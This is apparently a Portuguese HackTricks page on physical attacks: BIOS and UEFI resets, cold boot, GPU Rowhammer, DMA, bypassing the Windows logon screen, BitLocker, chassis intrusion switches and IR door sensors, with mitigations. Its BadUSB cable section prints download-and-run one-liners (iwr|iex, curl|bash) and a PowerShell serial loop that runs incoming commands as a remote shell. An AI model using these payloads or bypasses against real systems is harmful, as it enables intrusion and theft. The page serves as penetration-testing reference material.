# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperação de senha do BIOS e segurança do sistema

As configurações de firmware de PCs antigos podem ser redefinidas desconectando a bateria CMOS ou usando um jumper documentado para limpar o CMOS. O tempo necessário com o equipamento desligado varia conforme a placa, e senhas ou chaves modernas de UEFI podem estar armazenadas em memória flash não volátil, em um controlador integrado ou em um dispositivo de segurança e, portanto, sobreviver à remoção da bateria. Consulte o manual da placa ou de serviço antes de curto-circuitar pinos; esse procedimento também pode invalidar medições do TPM e acionar a recuperação da criptografia de disco.

Em sistemas x86 antigos, ferramentas como **killCMOS** e **CmosPwd** podem inspecionar ou alterar configurações armazenadas no CMOS a partir de um ambiente inicializável. O CmosPwd reconhece formatos de senha de um conjunto documentado de famílias de BIOS antigas e pode fazer backup, restaurar ou apagar/eliminar o estado do CMOS; suas versões publicadas destinam-se a ambientes DOS/Windows, Linux, FreeBSD e NetBSD antigos.<sup>[[18]](#references)</sup> Esses utilitários não são ferramentas genéricas para remover senhas de UEFI e exigem acesso suficiente ao hardware/firmware.

Alguns firmwares de laptop exibem um código de desafio específico do fabricante após várias tentativas de senha malsucedidas. Bancos de dados como [bios-pw.org](https://bios-pw.org) podem derivar senhas de recuperação de fabricantes antigos para alguns modelos, mas muitos sistemas implementam um bloqueio sem um desafio que possa ser derivado. Considere qualquer senha gerada específica do modelo e evite esgotar os contadores permanentes de tentativas.

### Segurança de UEFI

Em sistemas modernos com **UEFI**, o CHIPSEC pode auditar as proteções das variáveis do Secure Boot. Comece pela verificação que não modifica o sistema abaixo; o modo opcional `-a modify` tenta corromper variáveis deliberadamente e só deve ser usado em um sistema de laboratório que possa ser recuperado. O próprio CHIPSEC alerta que seu driver privilegiado e o acesso de baixo nível ao hardware são inadequados para endpoints de produção.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Análise de RAM e ataques cold-boot

A DRAM não perde todos os bits imediatamente quando a atualização para. A taxa de decaimento varia substancialmente conforme a tecnologia do módulo e a temperatura; o resfriamento pode preservar dados úteis por muito mais tempo do que um ciclo de desligamento e religamento sem resfriamento. Um ataque cold-boot reinicializa rapidamente o sistema em um ambiente mínimo de aquisição ou transfere um módulo resfriado, captura a memória bruta e reconstrói chaves criptográficas apesar do decaimento dos bits. Um utilitário de cópia de disco não é automaticamente um criador de imagens de memória física, e o Volatility analisa uma captura, mas não a adquire; use uma ferramenta de aquisição validada e apropriada à plataforma.<sup>[[12]](#references)</sup>

---

## Rowhammer em GPU contra tabelas de páginas

Os ataques modernos de Rowhammer em GPU se tornam muito mais úteis quando visam **metadados de memória virtual da GPU** em vez de buffers comuns. Trabalhos recentes em **GPUs NVIDIA Ampere com GDDR6** mostram que um atacante executando código CUDA sem privilégios pode criar padrões de hammering específicos para GPU, usar **memory massaging** para posicionar estruturas de paginação em linhas vulneráveis e, então, inverter bits na **tabela de páginas de último nível** ou em um **diretório de páginas** intermediário. Depois que uma única entrada de tradução é corrompida, o atacante pode estabelecer **leitura/gravação arbitrária de memória da GPU** e, em seguida, avançar para comprometer o host.<sup>[[1]](#references)[[2]](#references)</sup>

### Padrão de exploração

1. **Identificar linhas vulneráveis a hammering** na GDDR6 e criar padrões de hammering sensíveis às atualizações e não uniformes que contornem as mitigações na DRAM.
2. **Manipular alocações da GPU** para que o driver posicione estruturas de tradução de páginas em locais físicos vulneráveis a hammering, em vez de mantê-las no pool protegido padrão. Na prática, isso pode envolver esgotar a região de baixa memória usada pelas tabelas de páginas e pulverizar grandes mapeamentos UVM esparsos com passos controlados.
3. **Inverter bits dos metadados de tradução**, como bits **PFN** ou relacionados à abertura, em uma entrada de tabela de páginas/diretório de páginas, fazendo com que a página virtual controlada pelo atacante aponte para páginas de tabelas de páginas, memória arbitrária da GPU ou mapeamentos de sistema visíveis ao host.
4. Reutilizar o mapeamento forjado para reescrever outras entradas de tradução e escalar para **leitura/gravação arbitrária de memória da GPU** entre contextos da GPU.

### Avanço para o host e mitigações

- Com o **IOMMU desativado**, mapeamentos forjados da abertura de sistema podem expor **memória física arbitrária do host** à GPU, transformando a primitiva da GPU em um comprometimento completo do host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** visa entradas da tabela de páginas de último nível, enquanto **GeForge** mostra que corromper um nível do diretório de páginas pode ser mais fácil, pois uma inversão de bit pode redirecionar uma subárvore de tradução maior. Não considere apenas uma camada de paginação como crítica para a segurança.<sup>[[1]](#references)[[2]](#references)</sup>
- O **IOMMU** continua sendo importante porque bloqueia o caminho direto para acesso arbitrário à memória do host usado por GDDRHammer/GeForge, mas **não é uma mitigação completa**. **GPUBreach** demonstra um avanço em uma segunda etapa, no qual o atacante corrompe buffers de CPU graváveis pela GPU e pertencentes ao driver e, em seguida, aciona bugs de segurança de memória no driver NVIDIA para obter uma primitiva de gravação no kernel e um **shell root**, mesmo com o IOMMU ativado.<sup>[[3]](#references)</sup>
- **ECC em nível de sistema** é uma medida prática de fortalecimento em GPUs compatíveis para workstations/servidores. GPUs de consumo sem ECC oferecem uma superfície de defesa mais fraca.<sup>[[4]](#references)</sup>
- Esses ataques não são puramente teóricos: **GeForge** relatou **1.171** inversões de bits em uma RTX 3060 e **202** em uma RTX A6000, quantidade suficiente para criar uma cadeia funcional de escalonamento de privilégios no host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acesso direto à memória (DMA)

Para a aplicação offline de patches em IFR/NVRAM UEFI que pode reduzir o nível de aplicação do IOMMU antes da inicialização e habilitar uma cadeia de ataque DMA no Windows, consulte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstra aquisição e aplicação de patches de memória por DMA em interfaces como FireWire e configurações iniciais do Thunderbolt, incluindo assinaturas históricas de bypass de login. Não é simplesmente “ineficaz contra o Windows 10”: a possibilidade de exploração depende da interface, da build do sistema-alvo, da política do IOMMU, do estado de bloqueio e do suporte e da ativação da Proteção DMA do Kernel do Windows. O Windows 10 versão 1803 e posteriores introduziram a Proteção DMA do Kernel em plataformas compatíveis, alterando substancialmente a superfície de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acesso ao sistema

Em um volume do Windows não criptografado ou já desbloqueado, um ambiente offline pode substituir binários de acessibilidade, como **sethc.exe** ou **Utilman.exe**, por **cmd.exe**, obtendo um prompt de comando SYSTEM quando o atalho correspondente na tela de logon é acionado. Ferramentas como **chntpw** podem editar dados de contas locais do SAM. Esses métodos não contornam um volume BitLocker bloqueado e podem danificar credenciais protegidas com DPAPI/EFS; preserve cópias forenses e backups.

**Kon-Boot** é uma ferramenta comercial de bypass de autenticação na inicialização para configurações compatíveis do Windows/macOS. A compatibilidade depende do sistema operacional, do modo de firmware, do Secure Boot e da configuração de criptografia do disco; a ferramenta não descriptografa um volume BitLocker bloqueado.<sup>[[10]](#references)</sup>

---

## Como lidar com recursos de segurança do Windows

### Atalhos de inicialização e recuperação

- **Delete/Supr**, F2, F10 ou outra tecla do fabricante pode abrir a configuração do firmware.
- **F8** acessa as opções avançadas de inicialização legadas do Windows apenas em configurações nas quais esse caminho continua habilitado; o acesso à recuperação atual varia.
- Manter **Shift** pressionado pode impedir o logon automático do Windows em algumas configurações, embora as definições de política/registro possam desativar esse comportamento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** e placas Teensy podem ser enumerados como teclados HID confiáveis e injetar sequências de teclas predefinidas. A carga útil inicialmente tem os privilégios e o acesso à área de trabalho da sessão conectada; prompts do UAC, bloqueio de tela, layout do teclado, temporização e política de USB dos endpoints ainda impõem restrições.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Privilégios de administrador ou de backup podem criar uma cópia de sombra ou salvar hives do registro para que arquivos bloqueados, como **SAM** e **SYSTEM**, possam ser adquiridos. Essa é uma técnica de coleta pós-comprometimento, não um bypass de privilégios, e deve ser correlacionada com eventos do `diskshadow`/VSS e de exportação de hives do registro.

## Técnicas de implante BadUSB / HID

### Implantes em cabos com Wi-Fi

- Implantes baseados em ESP32-S3, como **Evil Crow Cable Wind**, ficam ocultos em cabos USB-A→USB-C ou USB-C↔USB-C, são enumerados exclusivamente como teclado USB e disponibilizam sua pilha C2 por Wi-Fi. O operador só precisa alimentar o cabo pelo host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789` e acessar [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para chegar à interface HTTP integrada.<sup>[[8]](#references)</sup>
- A interface do navegador oferece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. As cargas úteis armazenadas são identificadas por sistema operacional, os layouts de teclado são alternados em tempo real e as strings VID/PID podem ser alteradas para imitar periféricos conhecidos.
- Como o C2 fica dentro do cabo, um telefone pode preparar cargas úteis, acionar sua execução e gerenciar credenciais Wi-Fi sem usar a rede da organização — algo útil em invasões físicas de curta duração.

### Cargas úteis AutoExec com reconhecimento do sistema operacional

- As regras do AutoExec associam uma ou mais cargas úteis para execução imediata após a enumeração USB. O implante realiza uma identificação simples do sistema operacional e seleciona o script correspondente.
- Exemplo de fluxo de trabalho:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como a execução ocorre sem supervisão, basta trocar um cabo de carregamento para obter acesso inicial “plug-and-pwn” no contexto do usuário conectado.

### Shell remoto via Wi-Fi TCP iniciado por HID

1. **Inicialização por pressionamento de teclas:** uma carga útil armazenada abre um console e cola um loop que executa o que quer que chegue pelo novo dispositivo serial USB. Uma variante mínima para Windows é:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** O implant mantém o canal USB CDC aberto enquanto seu ESP32-S3 inicia um cliente TCP (script Python, APK Android ou executável desktop) de volta ao operador. Todos os bytes digitados na sessão TCP são encaminhados para o loop serial acima, permitindo a execução remota de comandos até mesmo em hosts isolados da rede. A saída é limitada, então os operadores normalmente executam comandos às cegas (criação de contas, preparação de ferramentas adicionais etc.).

### Superfície de atualização HTTP OTA

- A interface documentada do Evil Crow Cable expõe um endpoint de atualização de firmware não autenticado em `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operadores de campo podem trocar recursos a quente (por exemplo, gravar o firmware do USB Army Knife) durante um engagement, sem abrir o cabo, permitindo que o implante passe a usar novos recursos enquanto continua conectado ao host-alvo.

## Contornando a criptografia do BitLocker

Uma aquisição forense autorizada de um sistema ativo ou que tenha sido executado recentemente pode conter uma chave mestra de volume do BitLocker ou material de chave relacionado enquanto o volume estiver desbloqueado. Ferramentas comerciais como Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic podem pesquisar imagens de memória, arquivos de hibernação ou dumps de falha compatíveis, mas o sucesso não é garantido. O Windows moderno também criptografa dumps de falha quando o BitLocker está habilitado, e uma senha de recuperação de 48 dígitos armazenada é um artefato diferente de uma chave de volume em memória.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Engenharia social para adicionar uma chave de recuperação

Um atacante que convence um administrador a executar comandos de gerenciamento do BitLocker pode adicionar um protetor de senha de recuperação, chave externa ou outro tipo e, em seguida, capturá-lo. Uma senha de recuperação não pode ser uma sequência arbitrária de zeros: as senhas numéricas de recuperação do BitLocker têm um formato validado de 48 dígitos. A sintaxe relevante para administração autorizada é `manage-bde -protectors -add C: -recoverypassword`; liste os protetores resultantes com `manage-bde -protectors -get C:`. Monitore adições de protetores e garanta que o novo material de recuperação seja armazenado em escrow apenas em locais aprovados.<sup>[[16]](#references)</sup>

---

## Explorando chaves de intrusão no chassi/manutenção para redefinir o BIOS para as configurações de fábrica

Muitos laptops modernos e desktops de formato pequeno incluem uma **chave de intrusão no chassi** monitorada pelo Embedded Controller (EC) e pelo firmware do BIOS/UEFI. Embora o principal objetivo da chave seja gerar um alerta quando o dispositivo é aberto, às vezes os fabricantes implementam um **atalho de recuperação não documentado**, acionado quando a chave é alternada em um padrão específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Como o ataque funciona

1. A chave é conectada a uma **interrupção GPIO** no EC.
2. O firmware em execução no EC controla o **tempo e o número de pressionamentos**.
3. Quando um padrão codificado é reconhecido, o EC invoca uma rotina de *mainboard-reset* que **apaga o conteúdo da NVRAM/CMOS do sistema**.
4. Na próxima inicialização, os modelos afetados carregam o estado de firmware redefinido. Dependendo do fabricante e da revisão, o estado apagado pode incluir uma senha de supervisor, configurações de inicialização personalizadas ou chaves Secure Boot inscritas; o estado do TPM e os efeitos sobre a criptografia do disco devem ser avaliados separadamente.

> Uma redefinição do firmware pode restaurar as opções de inicialização externa, mas **não** descriptografa o armazenamento. O BitLocker ou outro sistema de criptografia de disco completo pode entrar em modo de recuperação após alterações no TPM/firmware e continuar protegendo a unidade interna sem uma chave de recuperação.<sup>[[16]](#references)</sup>

### Exemplo real — laptop Framework 13

O atalho de recuperação do Framework 13 (11ª/12ª/13ª geração) é:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Após o décimo ciclo, o EC define uma flag que instrui o BIOS a apagar a NVRAM na próxima reinicialização. Todo o procedimento leva ~40 s e requer **nada além de uma chave de fenda**.<sup>[[5]](#references)</sup>

### Procedimento Genérico de Exploração

1. Ligue ou suspenda e retome o alvo para que o EC esteja em execução.
2. Remova a tampa inferior para expor o interruptor de intrusão/manutenção.
3. Reproduza o padrão de alternância específico do fabricante (consulte a documentação, fóruns ou faça engenharia reversa do firmware do EC).
4. Remonte e reinicie; em seguida, verifique quais configurações de firmware e credenciais realmente foram alteradas.
5. Se houver autorização e o boot externo estiver disponível, inicialize por uma imagem live controlada. Depois que um volume interno for legitimamente desbloqueado (ou se nunca tiver sido criptografado), o ambiente live poderá obter credenciais e dados ou inspecionar a EFI System Partition. Modificar essa partição para instalar um implante EFI é persistente e altamente intrusivo, além de continuar sujeito às restrições do Secure Boot, do measured boot, da proteção contra gravação do firmware e do monitoramento de endpoints. O armazenamento criptografado permanece inacessível sem a chave ou o material de recuperação.

### Detecção e Mitigação

* Registre eventos de intrusão no chassi no console de gerenciamento do SO e correlacione-os com reinicializações inesperadas do BIOS.
* Use **lacres invioláveis** nos parafusos/tampas para detectar a abertura.
* Mantenha os dispositivos em **áreas com controle físico**; presuma que o acesso físico equivale ao comprometimento total.
* Quando disponível, desative o recurso do fabricante “maintenance switch reset” ou exija uma autorização criptográfica adicional para redefinições da NVRAM.

---

## Injeção IR Encoberta Contra Sensores de Saída Sem Toque

### Características do Sensor
- Sensores comerciais de saída por gesto combinam um emissor de LED de infravermelho próximo com um módulo receptor semelhante ao de um controle remoto de TV, que só sinaliza nível lógico alto após detectar vários pulsos (~4–10) da portadora correta (≈30 kHz).<sup>[[7]](#references)</sup>
- Uma cobertura plástica impede que o emissor e o receptor apontem diretamente um para o outro, então o controlador presume que qualquer portadora validada veio de um reflexo próximo e aciona um relé que destrava a porta.
- Depois que o controlador detecta a presença de um alvo, ele frequentemente altera o envelope de modulação de saída, mas o receptor continua aceitando qualquer rajada que corresponda à portadora filtrada.

### Fluxo de Ataque
1. **Capture o perfil de emissão** – conecte um analisador lógico aos pinos do controlador para registrar as formas de onda anteriores e posteriores à detecção que acionam o LED IR interno.
2. **Reproduza apenas a forma de onda “pós-detecção”** – remova/ignore o emissor original e acione um LED IR externo com o padrão já ativado desde o início. Como o receptor só verifica a contagem de pulsos/frequência, ele interpreta a portadora falsificada como um reflexo genuíno e ativa a linha do relé.
3. **Controle a transmissão** – transmita a portadora em rajadas ajustadas (por exemplo, dezenas de milissegundos ligada e um período semelhante desligada) para fornecer a contagem mínima de pulsos sem saturar o AGC do receptor nem os mecanismos de tratamento de interferência. A emissão contínua dessensibiliza rapidamente o sensor e impede o acionamento do relé.

### Injeção Refletiva de Longo Alcance
- Substituir o LED de bancada por um diodo IR de alta potência, um driver MOSFET e óptica de focalização permite acionamentos confiáveis a uma distância de ~6 m.
- O atacante não precisa ter linha de visão direta para a abertura do receptor; apontar o feixe para paredes internas, prateleiras ou batentes de porta visíveis através do vidro permite que a energia refletida entre no campo de visão de ~30° e imite um gesto de mão a curta distância.
- Como os receptores esperam apenas reflexos fracos, um feixe externo muito mais forte pode refletir em várias superfícies e ainda permanecer acima do limiar de detecção.

### Lanterna de Ataque Armamentizada
- Integrar o driver dentro de uma lanterna comercial disfarça a ferramenta. Substitua o LED visível por um LED IR de alta potência compatível com a banda do receptor, adicione um ATtiny412 (ou similar) para gerar as rajadas de ≈30 kHz e use um MOSFET para drenar a corrente do LED.
- Uma lente telescópica de zoom estreita o feixe para aumentar o alcance/precisão, enquanto um motor de vibração controlado pelo MCU fornece confirmação tátil de que a modulação está ativa, sem emitir luz visível.
- Alternar entre vários padrões de modulação armazenados (frequências de portadora e envelopes ligeiramente diferentes) aumenta a compatibilidade com famílias de sensores rebatizadas, permitindo que o operador varra superfícies refletoras até ouvir o clique do relé e a porta destravar.

---

## References

- [1] [GDDRHammer: Perturbando Intensamente Linhas DRAM — Ataques Rowhammer entre Componentes a partir de GPUs Modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Aplicando Rowhammer à memória GDDR para Forjar Tabelas de Páginas de GPU por Diversão e Lucro](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataques de Escalonamento de Privilégios em GPUs usando Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de Segurança: Rowhammer - julho de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pressione aqui para dominar”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guia de redefinição da placa-mãe](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Nãããããão Toque! – Contornando sensores IR de saída sem toque com uma lanterna IR encoberta”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Conecte, use, domine: hacking com Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentação oficial e informações de compatibilidade do Kon-Boot](https://kon-boot.com/)
- [11] [Documentação do CHIPSEC - Proteções de variáveis do Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Para que Não Esqueçamos: Ataques de Cold Boot contra Chaves de Criptografia](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulação de memória física por DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Proteção DMA do Kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentação do Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guia de operações do BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - manter Shift pressionada e comportamento de logon automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentação e downloads do CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
